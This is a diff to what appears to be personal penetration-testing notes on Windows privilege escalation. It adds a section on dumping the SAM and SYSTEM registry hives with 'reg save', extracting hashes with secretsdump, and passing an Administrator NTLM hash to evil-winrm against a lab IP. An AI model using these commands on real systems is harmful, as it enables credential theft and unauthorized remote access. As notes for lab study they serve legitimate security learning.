@@ -264,7 +264,7 @@ Run the exploit script to gain a root shell:
 ## Situational awareness
 
 Powershell Commands
-
+	
 * `whoami`
 * `whoami /groups`
 * ```Get-LocalUser```
@@ -272,6 +272,28 @@ Powershell Commands
 * `ipconfig` : To get all the interfaces of the network.
 * `netsta -ano` : To get all the connections that are running on the system.
 * `Get-Process` : To see all the processes.
+
+## Abusing unprivelleged users
+
+Making them part of administrators group is the best way because you can then directly RDP them or user WinRM to access that machine.
+
+We can also download the sam and system bakup of files from registry 
+
+```powershell
+reg save hklm\system system.bak
+```
+```powershell
+reg save hklm\sam sam.bak
+```
+And pass it to secretdumps.py and get the hashes of the users. Once we have the hashes of the user we can pass it on to evil-winrm.
+
+```bash
+evil-winrm -i 10.10.142.152 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
+```
+
+
+
+
 
 
 
